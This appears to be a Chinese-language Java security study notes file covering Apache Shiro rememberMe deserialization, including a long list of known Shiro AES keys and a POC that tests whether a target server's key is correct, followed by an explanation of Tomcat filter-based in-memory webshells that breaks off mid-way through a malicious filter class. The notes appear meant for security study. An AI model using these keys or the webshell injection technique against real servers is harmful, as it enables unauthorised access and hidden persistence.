2AvVCXsxUs0FSA7SYFjdQg==
2AvVhdsgERdsSA3SDFAdag==
2AvVhdsgUs0FSA3SDFAder==
2AvVhdsgUs0FSA3SaFAdfg==
2AvVhdsgUsOFSA3SDFAdag==
2AvVhmFLUs0KTA3Kprsdag==
2AvVidsaUSofSA3SDFAdog==
2adsfasdqerqerqewradsf==
3Av2hmFLAs0BTA3Kprsd6E==
3AvVhMFLIs0KTA3Kprsdag==
3AvVhdAgUs1FSA4SDFAdBg==
3AvVhmFLUs0KTA3KaTHGFg==
3qDVdLawoIr1xFd6ietnsg==
3rvVhmFLUs0KAT3Kprsdag==
4AvVhm2LUs0KTA3Kprsdag==
4AvVhmFLUs0KTA3KAAAAAA==
4AvVhmFLUs0KTA3Kprseaf==
4AvVhmFLUs0TTA3Kprsdag==
4AvVhmFLUs5KTA1Kprsdag==
4AvVhmFLUsOKTA3Kprsdag==
4WCZSJyqdUQsije93aQIRg==
4rvVhmFLUs0KAT3Kprsdag==
5AvVhCsgUs0FSA3SDFAdag==
5oiR5piv5p2h5ZK46bG8IQ==
8AvVhdsgUs0FSA3SDFAdag==
9AVvhnFLuS3KTV8KprsdAg==
9Ami6v2G5Y+r5aPnE4OlBB==
A+kWR7o9O0/G/W6aOGesRA==
AF05JAuyuEB1ouJQ9Y9Phg==
AztiX2RUqhc7dhOzl1Mj8Q==
B9rPF8FHhxKJZ9k63ik7kQ==
Cj6LnKZNLEowAZrdqyH/Ew==
FP7qKJzdJOGkzoQzo2wTmA==
FjbNm1avvGmWE9CY2HqV75==
GHxH6G3LFh8Zb3NwoRgfFA==
GhrF5zLfq1Dtadd1jlohhA==
HOlg7NHb9potm0n5s4ic0Q==
M2djA70UBBUPDibGZBRvrA==
QDFCnfkLUs0KTA3Kprsdag==
QF5HMyZAWDZYRyFnSGhTdQ==
QUxQSEFNWVNPRlRCVUlMRA==
QVN1bm5uJ3MgU3Vuc2l0ZQ==
R29yZG9uV2ViAAAAAAAAAA==
TGMPe7lGO/Gbr38QiJu1/w==
UGlzMjAxNiVLeUVlXiEjLw==
YVd4dmRtVjViM1UlM0QIdn==
YWdlbnRAZG1AMjAxOHN3Zg==
YnlhdnMAAAAAAAAAAAAAAA==
YystomRZLMUjiK0Q1+LFdw==
Z3VucwAAAAAAAAAAAAABBB==
Z3VucwACAOVAKALACAADSA==
ZGdmdwAAAAAAAAAAAAAAAA
ZUdsaGJuSmxibVI2ZHc9PQ
a69ec781563b1a5d791f7b2bdd117a36
aG91c2Vob3VzZWhvdXNlMg==
b2EAAAAAAAAAAAAAAAAAAA==
c2hvdWtlLXBsdXMuMjAxNg==
duhfin37x6chw29jsne45m==
fCq+/xW488hMTCE+cmJ3FF==
kPv59vyqzj00x11LXJZTjJ2UHW48jzHN
lt181dcQVz/Bo9Wb8ws/Cg==
mIccZhQt6EBHrZIyw1FAXQ==
pbnA+Qzen1vjV3rNqQBLHg==
pyyX1c5x2f0LZZ7VKZXjKO==
qQFtSnnj/sx7vu51ixAyEQ==
sBv2t3okbdm3U0r2EVcSzB==
sgIQrqUVxa1OZRRIK3hLZw==
w793pPq5ZVBKkj8OhV4KaQ==
wrjUh2ttBPQLnT4JVhriug==
wyLZMDifwq3sW1vhhHpgKA==
kPH+bIxk5D2deZiIxcaaaA== 
4AvVhmFLUs0KTA3Kprsdag== 
WkhBTkdYSUFPSEVJX0NBVA== 
U3ByaW5nQmxhZGUAAAAAAA== 
cGljYXMAAAAAAAAAAAAAAA== 
d2ViUmVtZW1iZXJNZUtleQ== 
fsHspZw/92PrS3XrPW+vxw== 
sHdIjUN6tzhl8xZMG3ULCQ== 
WuB+y2gcHRnY2Lg9+Aqmqg== 
ertVhmFLUs0KTA3Kprsdag== 
2itfW92XazYRi5ltW0M2yA== 
6ZmI6I2j3Y+R1aSn5BOlAA== 
f/SY5TIve5WWzT4aQlABJA== 
Jt3C93kMR9D5e8QzwfsiMw== 
aU1pcmFjbGVpTWlyYWNsZQ== 
XTx6CKLo/SdSgub+OPHSrw== 
8AvVhmFLUs0KTA3Kprsdag== 
66v1O8keKNV3TTcGPK1wzg== 
Q01TX0JGTFlLRVlfMjAxOQ== 
5AvVhmFLUS0ATA4Kprsdag== 
ZmFsYWRvLnh5ei5zaGlybw== 
0AvVhmFLUs0KTA3Kprsdag== 
r0e3c16IdVkouZgk1TKVMg== 
Z3VucwAAAAAAAAAAAAAAAA== 
5J7bIJIV0LQSN3c9LPitBQ== 
ZnJlc2h6Y24xMjM0NTY3OA== 
yeAAo1E8BOeAYfBlm4NG9Q== 
a3dvbmcAAAAAAAAAAAAAAA== 
4BvVhmFLUs0KTA3Kprsdag== 
s0KTA3mFLUprK4AvVhsdag== 
yNeUgSzL/CfiWw1GALg6Ag== 
OY//C4rhfwNxCQAQCrQQ1Q== 
fCq+/xW488hMTCD+cmJ3aQ== 
ZAvph3dsQs0FSL3SDFAdag== 
MTIzNDU2NzgxMjM0NTY3OA== 
1AvVhdsgUs0FSA3SDFAdag== 
Bf7MfkNR0axGGptozrebag== 
1QWLxg+NYmxraMoxAXu/Iw== 
6AvVhmFLUs0KTA3Kprsdag== 
6NfXkC7YVCV5DASIrEm1Rg== 
2AvVhdsgUs0FSA3SDFAdag== 
9FvVhtFLUs0KnA3Kprsdyg== 
OUHYQzxQ/W9e/UjiAGu6rg== 
ClLk69oNcA3m+s0jIMIkpg== 
vXP33AonIp9bFwGl7aT7rA== 
NGk/3cQ6F5/UNPRh8LpMIg== 
MPdCMZ9urzEA50JDlDYYDg== 
c2hpcm9fYmF0aXMzMgAAAA== 
XgGkgqGqYrix9lI6vxcrRw== 
2A2V+RFLUs+eTA3Kpr+dag== 
5AvVhmFLUs0KTA3Kprsdag== 
3AvVhmFLUs0KTA3Kprsdag== 
WcfHGU25gNnTxTlmJMeSpw== 
bWljcm9zAAAAAAAAAAAAAA== 
bWluZS1hc3NldC1rZXk6QQ== 
bXRvbnMAAAAAAAAAAAAAAA== 
6ZmI6I2j5Y+R5aSn5ZOlAA== 
3JvYhmBLUs0ETA5Kprsdag== 
A7UzJgh1+EWj5oBFi+mSgw== 
Is9zJ3pzNh2cgTHB4ua3+Q== 
25BsmdYwjnfcWmnhAciDDg== 
cmVtZW1iZXJNZQAAAAAAAA== 
7AvVhmFLUs0KTA3Kprsdag== 
3qDVdLawoIr1xFd6ietnwg== 
Y1JxNSPXVwMkyvES/kJGeQ== 
xVmmoltfpb8tTceuT5R7Bw== 
O4pdf+7e+mZe8NyxMTPJmQ== 
SDKOLKn2J1j/2BHjeZwAoQ== 
a2VlcE9uR29pbmdBbmRGaQ== 
V2hhdCBUaGUgSGVsbAAAAA== 
GAevYnznvgNCURavBhCr1w== 
hBlzKg78ajaZuTE0VLzDDg== 
2cVtiE83c4lIrELJwKGJUw== 
9AvVhmFLUs0KTA3Kprsdag== 
SkZpbmFsQmxhZGUAAAAAAA== 
lT2UvDUmQwewm6mMoiw4Ig== 
HWrBltGvEZc14h9VpMvZWw== 
8BvVhmFLUs0KTA3Kprsdag== 
bya2HkYo57u6fWh5theAWw== 
IduElDUpDDXE677ZkhhKnQ== 
1tC/xrDYs8ey+sa3emtiYw== 
MTIzNDU2Nzg5MGFiY2RlZg== 
c+3hFGPjbgzGdrC+MHgoRQ== 
rPNqM6uKFCyaL10AK51UkQ== 
5aaC5qKm5oqA5pyvAAAAAA== 
cGhyYWNrY3RmREUhfiMkZA== 
MzVeSkYyWTI2OFVLZjRzZg== 
YI1+nBV//m7ELrIyDHm6DQ== 
empodDEyMwAAAAAAAAAAAA== 
NsZXjXVklWPZwOfkvk6kUA== 
ZUdsaGJuSmxibVI2ZHc9PQ== 
L7RioUULEFhRyxM7a2R/Yg== 
i45FVt72K2kLgvFrJtoZRw== 
zSyK5Kp6PZAAjlT+eeNMlg== 
kPv59vyqzj00x11LXJZTjJ2UHW48jzHN 
wGiHplamyXlVB11UXWol8g== 
6Zm+6I2j5Y+R5aS+5ZOlAA== 
U3BAbW5nQmxhZGUAAAAAAA== 
3AvVhmFLUs0KTA3Kprsdag ==
123dasd456
AsfawfsdfaAasdWWW==
LEGEND-CAMPUS-CIPHERKEY==
ZWvohmPdUsAWT3=KpPqda
dsesfswfjn23409isfad2==
m0@5ZZ9L4jjQXn7MREp^b^7I
CrownKey==a12d/dakdad
YTM0NZomIzI2OTsmIzM0NTueYQ==
Z3h6eWd4enklMjElMjElMjE=
```

https://mp.weixin.qq.com/s/WDmj4-2lB-hlf_Fm_wDiOg

## CVE2016-6802 

## CVE2020-11989

https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/

## shiro 检测key

可以使用 urldns 链检测，其不受jdk版本限制，也需依赖，但是这种方法有一定的局限性，比如：不出网、有延迟、目标地址网络连接被waf阻断等等。

所以来看 一种另类的 shiro 检测方式。

在 **request** 的 **cookie** 中写入 **rememberMe=1** (这个值是随便的)；

response 返回包返回 `rememberMe=deleteMe`

![image-20220219161738228](img/image-20220219161738228.png)![image-20220219161738228](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220219161738228.png?lastModify=1646033842)

调试跟一下，

在`AbstractRememberMeManager#getRememberedPrincipals` 下断点

![image-20220219162109117](img/image-20220219162109117.png)![image-20220219162109117](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220219162109117.png?lastModify=1646033842)

看看`getRememberedSerializedIdentity` 干了啥，跟进

![image-20220219162256455](img/image-20220219162256455.png)![image-20220219162256455](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220219162256455.png?lastModify=1646033842)

很明显，拿到刚传的 cookie 值，然后补齐格式，base64解码后返回。

回到`getRememberedPrincipals`，满足if 条件进入，注意这里还有个 catch 捕获异常

![image-20220219162731869](img/image-20220219162731869.png)![image-20220219162731869](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220219162731869.png?lastModify=1646033842)

跟进`convertBytesToPrincipals` ，

![image-20220219162844036](img/image-20220219162844036.png)![image-20220219162844036](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220219162844036.png?lastModify=1646033842)

拿到解密服务后，进行解密，跟进

![image-20220219162928431](img/image-20220219162928431.png)![image-20220219162928431](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220219162928431.png?lastModify=1646033842)

继续跟进， decrypt 参数中有个 key 参数，

![image-20220219163032491](img/image-20220219163032491.png)![image-20220219163032491](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220219163032491.png?lastModify=1646033842)

这里解密拿 key 解密我们传过去的值，肯定是失败了，所以捕获到异常后抛出。

转而被刚开始 `getRememberedPrincipals` 方法中捕获到异常，

![image-20220219163136755](img/image-20220219163136755.png)![image-20220219163136755](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220219163136755.png?lastModify=1646033842)

跟进`onRememberedPrincipalFailure`

![image-20220219163219570](img/image-20220219163219570.png)![image-20220219163219570](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220219163219570.png?lastModify=1646033842)

跟进`forgetIdentity`

![image-20220219163247407](img/image-20220219163247407.png)![image-20220219163247407](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220219163247407.png?lastModify=1646033842)

将 request 和 response 放到 `forgetIdentity` 方法，跟进

![image-20220219163327113](img/image-20220219163327113.png)![image-20220219163327113](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220219163327113.png?lastModify=1646033842)

继续跟进`removeFrom`

![image-20220219163428542](img/image-20220219163428542.png)![image-20220219163428542](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220219163428542.png?lastModify=1646033842)

最后就是添加 response 头了

![image-20220219163547640](img/image-20220219163547640.png)![image-20220219163547640](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220219163547640.png?lastModify=1646033842)

还有

我们拿 gadget 去打的时候，拿正确的 key 进行shiro加密算法进行加密，但是最后依然在 **response** 里面携带了`rememberMe=deleteMe`。

![image-20220219163907218](img/image-20220219163907218.png)![image-20220219163907218](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220219163907218.png?lastModify=1646033842)

```
getRememberedPrincipals` --> `convertBytesToPrincipals
```

![image-20220219164030233](img/image-20220219164030233.png)![image-20220219164030233](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220219164030233.png?lastModify=1646033842)

这里解密成功，进入 `deserialize` 进行反序列化

![image-20220219164259349](img/image-20220219164259349.png)![image-20220219164259349](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220219164259349.png?lastModify=1646033842)

这里进行了强制类型转换，但是我们反序列化的 gadget 和此类型并没啥关系，

但是在做类型转换之前，先进入了 **DefaultSerializer#deserialize** 进行反序列化处理，等处理结束返回 **deserialized** 时候，进行类型转换自然又回到了上面提到的类型转换异常，

所以还是会有 `rememberMe=deleteMe;`

如果这里反序列化的是一个 PrincipalCollection 对象就不会出现异常。

那么可以找一个PrincipalCollection  对象序列化来测试 key。如果 key 正确，正常解密，就不会有 `rememberMe=deleteMe;`。

![image-20220219165851460](img/image-20220219165851460.png)![image-20220219165851460](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220219165851460.png?lastModify=1646033842)

找到 `SimplePrincipalCollection`

POC

```
package shiro;

import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.subject.SimplePrincipalCollection;
import org.apache.shiro.util.ByteSource;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class ShiroKey {
    public static void main(String[] args) throws Exception {
        SimplePrincipalCollection simplePrincipalCollection = new SimplePrincipalCollection();
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream obj = new ObjectOutputStream(byteArrayOutputStream);
        obj.writeObject(simplePrincipalCollection);
        obj.close();

        // 将其转化为 shiro 攻击 payload
        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource encrypt = aes.encrypt(byteArrayOutputStream.toByteArray(), key);
        System.out.println(encrypt.toString());
    }
}
```

如果是正确的 key 加密，服务端解密，正常流程，就不会再出现 `rememberMe=deleteMe;`。

![image-20220219170102376](img/image-20220219170102376.png)![image-20220219170102376](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220219170102376.png?lastModify=1646033842)

key 错误，就又出现了

![image-20220219170234037](img/image-20220219170234037.png)![image-20220219170234037](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220219170234037.png?lastModify=1646033842)

所以可以据此来快速的判断 key 是否正确。

[http://www.lmxspace.com/2020/08/24/%E4%B8%80%E7%A7%8D%E5%8F%A6%E7%B1%BB%E7%9A%84shiro%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F/](http://www.lmxspace.com/2020/08/24/一种另类的shiro检测方式/)

## shiro 动态修复key

[https://p3rh4ps.top/index.php/2021/10/19/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BF%AE%E6%94%B9key/](https://p3rh4ps.top/index.php/2021/10/19/shiro反序列化修改key/)

https://xz.aliyun.com/t/10746#toc-6



https://su18.org/post/shiro-1/

https://su18.org/post/shiro-2/

php伪造shiro漏洞 https://blog.happysec.cn/index/view/366.go

[https://skysec.top/2017/12/13/padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/](https://skysec.top/2017/12/13/padding-oracle和cbc翻转攻击/)

https://www.cnblogs.com/backlion/p/14077791.html

[https://superxiaoxiong.github.io/2019/11/26/shiro-padding-oracle-attack%E5%88%86%E6%9E%90/](https://superxiaoxiong.github.io/2019/11/26/shiro-padding-oracle-attack分析/)

https://www.anquanke.com/post/id/192819

https://xz.aliyun.com/t/7026

[https://superxiaoxiong.github.io/2019/11/26/shiro-padding-oracle-attack%E5%88%86%E6%9E%90/](https://superxiaoxiong.github.io/2019/11/26/shiro-padding-oracle-attack分析/)

https://blog.csdn.net/qq_41832837/article/details/109064636

https://xz.aliyun.com/t/8445

# 内存马

## 简介

内存马主要分为

1. servlet-api 类
   - filter 型
   - servlet 型
2. spring 类
   - 拦截器
   - controller 型
3. java instrumentation类
   - agent 型

## 获取 context

ps: 当web容器启动的时候会为每个 web 应用都创建一个 ServletContext 对象，代表当前 web 应用

```
ServletContext servletContext = request.getSession().getServletContext();
Field appctx = servletContext.getClass().getDeclaredField("context");
appctx.setAccessible(true);
// ApplicationContext 为 ServletContext 的实现类
ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

Field stdctx = applicationContext.getClass().getDeclaredField("context");
stdctx.setAccessible(true);
// 这样我们就获取到了 context 
StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
```

也可以其他方法获取 StandardContext

如果没有request对象的话，可以从当前线程中获取

```
org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();

StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();
```

https://zhuanlan.zhihu.com/p/114625962

三梦师傅的方法

https://xz.aliyun.com/t/7388#toc-1

从MBean中获取

https://scriptboy.cn/p/tomcat-filter-inject/

![图片](img/640.webp)![图片](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/640.webp?lastModify=1646033842)

看这里完善https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4g

总： https://i.hacking8.com/page/22200

## Tomcat-Filter

```
import javax.servlet.*;
import java.io.IOException;

public class MyFilter implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("init");
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("doFilter");
        // 放行
        filterChain.doFilter(servletRequest,servletResponse);
    }

    @Override
    public void destroy() {
        System.out.println("destory");
    }
}
```

web.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">
    
    <filter>
        <filter-name>MyFilter</filter-name>
        <filter-class>MyFilter</filter-class>
    </filter>
    <filter-mapping>
        <filter-name>MyFilter</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>
</web-app>
```

也可使用注解`@WebFilter`

filter实现分为静态和动态。

- 静态： xml文件中配置或者写注解
- 动态： 程序运行时动态生成

无论静态还是动态，都是通过解析`StandardContext`中的缓存构造`ApplicationFilterConfig`，进而生成当前应用请求链路的`ApplicationFilterChain`，并根据filter的顺序执行。

![image-20210330212301006](img/image-20210330212301006-164603385738612.png)

#### 请求过滤需要的Filter接口

调试`filterChain.doFilter`，设置断点

访问 http://localhost:8080/demo1

![image-20220210195235374](img/image-20220210195235374.png)![image-20220210195235374](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220210195235374.png?lastModify=1646033842)

跟进`doFilter`方法，到了`ApplicationFilterChain#doFilter`

![image-20220210195745707](img/image-20220210195745707.png)![image-20220210195745707](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220210195745707.png?lastModify=1646033842)

跟进`internalDoFilter`

![image-20220210200104045](img/image-20220210200104045.png)![image-20220210200104045](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220210200104045.png?lastModify=1646033842)

`this.filters[this.pos++];`获取下一个filter，然后放行。

继续跟进`doFilter`

```
WsFilter#doFilter
```

![image-20220210200352547](img/image-20220210200352547.png)![image-20220210200352547](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220210200352547.png?lastModify=1646033842)

```
ApplicationFilterChain#doFilter
```

![image-20220210200422779](img/image-20220210200422779.png)![image-20220210200422779](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220210200422779.png?lastModify=1646033842)

继续跟进，此次不满足`if (this.pos < this.n)`，进到esle

![image-20220210200530588](img/image-20220210200530588.png)![image-20220210200530588](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220210200530588.png?lastModify=1646033842)

最后一个filter执行 service 方法。

![image-20220210201335340](img/image-20220210201335340.png)![image-20220210201335340](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220210201335340.png?lastModify=1646033842)

只有其中有一个方法不执行`doFilter`，就不会走到`service`方法。

#### 应用启动需要的接口

- ApplicationFilterConfig
- FilterDef
- FilterMap

![image-20220210201758124](img/image-20220210201758124.png)![image-20220210201758124](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220210201758124.png?lastModify=1646033842)

![image-20220210201936896](img/image-20220210201936896.png)![image-20220210201936896](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220210201936896.png?lastModify=1646033842)

![image-20220210202005898](img/image-20220210202005898.png)![image-20220210202005898](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220210202005898.png?lastModify=1646033842)

#### 启动前的加载过程

- ServletContext
- ApplicationContext
- StandardContext

在servlet3.0之后，servelt和filter都可动态创建，见`ServletContext`

![image-20220210202248619](img/image-20220210202248619.png)![image-20220210202248619](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220210202248619.png?lastModify=1646033842)

ApplicationContext是 ServlerContext的实现类，实现了`ServletContext#addFilter`，用来像属性中的`StandardContext`实例添加`filterDef`

![image-20220210202651541](img/image-20220210202651541.png)![image-20220210202651541](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220210202651541.png?lastModify=1646033842)

`StandardContext`类中 filter 关键的3个属性和2个方法

- filterMaps
- filterDefs
- filterConfigs

![image-20220210202852775](img/image-20220210202852775.png)![image-20220210202852775](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220210202852775.png?lastModify=1646033842)

- addFilterDef()   填充filterDef对象
- filterStart()  根据filterDefs初始化 filterConfigs

![image-20220210203050189](img/image-20220210203050189.png)![image-20220210203050189](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220210203050189.png?lastModify=1646033842)

![image-20220210203152776](img/image-20220210203152776.png)![image-20220210203152776](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220210203152776.png?lastModify=1646033842)

先清空，后将新的filterConfig添加到 filterConfigs中。

类ApplicationFilterConfig是依赖FilterDef生成的，所以也可以等价理解为：根据 FilterDefs来初始化 filterConfigs

#### 请求到达时的处理流程

处理请求时，到达 StandardWrapperValve 类的 invoke 函数中：

![image-20220210203447839](img/image-20220210203447839.png)![image-20220210203447839](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220210203447839.png?lastModify=1646033842)

重点在于创建了filterChain来处理匹配到的filter请求，这里每个请求都会创建一个 filterChain，并不是所有请求共用的一个：

![image-20220210203513787](img/image-20220210203513787.png)![image-20220210203513787](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220210203513787.png?lastModify=1646033842)

请求处理完后，释放掉 filterChain

![image-20220210203638885](img/image-20220210203638885.png)![image-20220210203638885](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220210203638885.png?lastModify=1646033842)

具体看

```
ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);
```

![img](img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png?lastModify=1646033842)

查看当前是否存在 filterChain，有则复用；无则new一个。然后初始化配置：

![img](img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png?lastModify=1646033842)

然后从 context 上下文中获取到 FilterMaps：

![img](img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png?lastModify=1646033842)

接下来做两点操作：

1）从filterMap中寻找匹配路径的filter添加到链中：

![img](img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png?lastModify=1646033842)

![img](img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png?lastModify=1646033842)

2.）从filterMap中寻找filter的servlet名添加到链中：

![img](img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png?lastModify=1646033842)

总的来说，从StandandContext中获取filterMap；再从filterMap中找到和request对象能匹配到的filter-name；最后从StandandContext中通过filter-name找到filter-config实例。

![img](img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png?lastModify=1646033842)

最后通过 StandardWrapperValve#filterChain.doFilter() 来获取filter执行：

![img](img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png?lastModify=1646033842)

#### 注册流程总结

1. context启动时，调用ServletContainerInitializers添加filter，调用AbstractFilterRegistrationBean类的addRegistration方法向context添加filter
2. context中不存在FilterDef则创建对应FilterDef
3. AbstractFilterRegistrationBean中configure方法添加匹配filter的uri，默认为/*
4. context启动时，调用filterStart方法配置初始化ApplicationFilterConfig
5. 调用filter的init方法
6. 对每次到达的请求在StandardWrapperVavel的invoke方法中创建过滤器链
7. 根据名称获得ApplicationFilterConfig添加到过滤器链，通过ApplicationFilterConfig来获取filter执行

![https://cdn.jsdelivr.net/gh/cnsimo/pic_bed/20200704113125.png](img/57f9624fb9d66467a32805d90ec9016b.png)![https://cdn.jsdelivr.net/gh/cnsimo/pic_bed/20200704113125.png](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/57f9624fb9d66467a32805d90ec9016b.png?lastModify=1646033842)

#### 实现

**编写Filter恶意类**

```
package filter;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.io.InputStream;
import java.util.Locale;
import java.util.Scanner;

public class PocFilter implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("PocFilter  init");
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
